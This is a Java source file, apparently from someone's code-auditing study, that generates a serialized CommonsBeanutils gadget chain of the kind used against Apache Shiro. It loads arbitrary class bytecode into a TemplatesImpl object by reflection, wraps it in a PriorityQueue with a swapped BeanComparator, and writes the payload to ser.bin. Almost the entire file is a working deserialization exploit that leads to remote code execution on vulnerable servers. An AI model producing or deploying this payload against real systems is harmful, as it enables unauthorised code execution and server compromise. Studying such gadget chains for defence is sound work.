import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class ShiroCB {
    public static void main(String[] args) throws  Exception{
        //cc3
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\17140\\Desktop\\暑假实习\\java代码审计\\Cc1_test\\target\\classes\\Test.class"));
        byte codes[][]= {code};
        bytecodeField.set(templates,codes);
        //CB
        BeanComparator beanComparator = new BeanComparator("outputProperties",null);
        //cc2
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue= new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(2);
        //AbstractMapDecorator

        Class<PriorityQueue> c = PriorityQueue.class;
        Field comparatorField = c.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,beanComparator);

        serialize(priorityQueue);
        //unserialize("ser.bin");
        //Hashtable
        //PropertyUtils.getProperty(templates,"outputProperties");

    }
    public  static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        /*
        写对象，序列化
         */
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        /*
        读对象，反序列化
         */
        return obj;
    }

}
